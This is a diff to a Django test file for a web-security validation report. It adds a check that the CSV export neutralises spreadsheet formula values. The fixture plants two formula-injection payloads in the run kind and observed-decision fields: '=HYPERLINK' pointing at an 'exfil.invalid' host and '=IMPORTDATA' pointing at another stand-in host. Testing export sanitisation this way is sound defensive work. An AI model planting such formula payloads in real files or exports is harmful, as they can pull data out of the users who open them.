@@ -337,14 +337,14 @@ def test_unqualified_authorization_run_does_not_claim_verified_finding():
 
     owner, _, project, _ = _fixture_project()
     invalid_run = WebSecurityValidationRun.objects.create(
-        project=project, kind=WebSecurityValidationRun.Kind.AUTHORIZATION_MATRIX,
+        project=project, kind='=HYPERLINK("https://exfil.invalid")',
         status=WebSecurityValidationRun.Status.FAILED, input_sha256='d' * 64,
         summary={'total': 1, 'passed': 0, 'failed': 1}, created_by=owner,
     )
     WebSecurityObservation.objects.create(
         run=invalid_run, case_ref='indeterminate-case', identity_ref='test',
         identity_type='user', resource_ref='record', endpoint='/record',
-        method='GET', expected_allowed=False, observed_decision='error',
+        method='GET', expected_allowed=False, observed_decision='=IMPORTDATA("http://x.invalid")',
         passed=False, evidence_fingerprint='malformed',
     )
     payload = async_to_sync(_build_payload)(str(project.pk), None, 'full')
@@ -352,6 +352,10 @@ def test_unqualified_authorization_run_does_not_claim_verified_finding():
     assert projection['total'] == 1 and projection['policy_mismatch_total'] == 0
     assert projection['independent_verification'] is False
     assert projection['items'][0]['run_status'] == 'failed'
+    assert projection['items'][0]['run_kind'] == 'invalid'
+    assert projection['items'][0]['observed_decision'] == 'invalid'
+    assert '=HYPERLINK' not in _make_csv(payload).decode('utf-8')
+    assert '=IMPORTDATA' not in _make_csv(payload).decode('utf-8')
     assert projection['items'][0]['observation_fingerprint'] is None
     assert 'confirmed' not in {item['observed_decision'] for item in projection['items']}
 
